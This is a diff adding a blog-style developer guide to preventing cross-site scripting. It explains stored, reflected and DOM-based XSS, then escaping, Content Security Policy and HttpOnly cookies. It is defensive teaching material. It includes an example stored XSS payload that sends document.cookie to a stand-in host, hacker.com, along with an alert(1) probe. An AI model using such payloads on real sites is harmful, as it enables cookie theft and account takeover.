@@ -1,0 +1,48 @@
+---
+title: "Cross-Site Scripting (XSS): A Developer's Guide to Prevention"
+excerpt: "Cross-Site Scripting (XSS) is one of the most common and dangerous web vulnerabilities. This guide explains what XSS is, how attackers exploit it, and provides a clear, actionable checklist for developers to prevent it in their applications."
+imageUrl: "https://placehold.co/600x400.png"
+imageHint: "xss cybersecurity"
+author: "Huzi"
+category: "Cybersecurity"
+---
+
+Cross-Site Scripting (XSS) remains one of the top web vulnerabilities (OWASP Top 10). It occurs when an application includes untrusted data in a web page without proper validation or escaping. This allows attackers to execute malicious scripts in the victim's browser.
+
+If an attacker can run JavaScript on your user's browser, they can:
+- Steal cookies and session tokens (account takeover).
+- Redirect users to phishing sites.
+- Perform actions on behalf of the user.
+
+## Types of XSS
+
+### 1. Stored XSS (Persistent)
+The malicious script is saved to the specific database (e.g., in a comment field). Every time a user views that comment, the script executes.
+- **Example**: A hacker posts a comment: `<script>fetch('http://hacker.com?cookie='+document.cookie)</script>`.
+
+### 2. Reflected XSS (Non-Persistent)
+The script is embedded in a URL parameter and executed immediately by the server.
+- **Example**: `http://example.com/search?q=<script>alert(1)</script>`.
+
+### 3. DOM-Based XSS
+The vulnerability exists in the client-side code rather than the server-side code.
+
+## Prevention Checklist
+
+### 1. Escape All User Input
+The golden rule: **Never trust user input.**
+- Convert special characters into their HTML entities (e.g., `<` becomes `&lt;`).
+- Modern frameworks like **React**, **Vue**, and **Angular** do this automatically. This is why using `dangerouslySetInnerHTML` in React is... dangerous.
+
+### 2. Use Content Security Policy (CSP)
+CSP is an HTTP header that allows you to safeguard your site by restricting the sources of executable scripts.
+```http
+Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com;
+```
+This tells the browser: "Only execute scripts from my own domain or this specific CDN."
+
+### 3. HttpOnly Cookies
+Store sensitive session tokens in `HttpOnly` cookies. JavaScript cannot access these cookies, meaning even if an XSS attack succeeds, the attacker cannot steal the session token.
+
+## Conclusion
+Security is a multilayered approach. By escaping data, using modern frameworks, and implementing CSP, you can effectively neutralize the threat of XSS and keep your users safe.
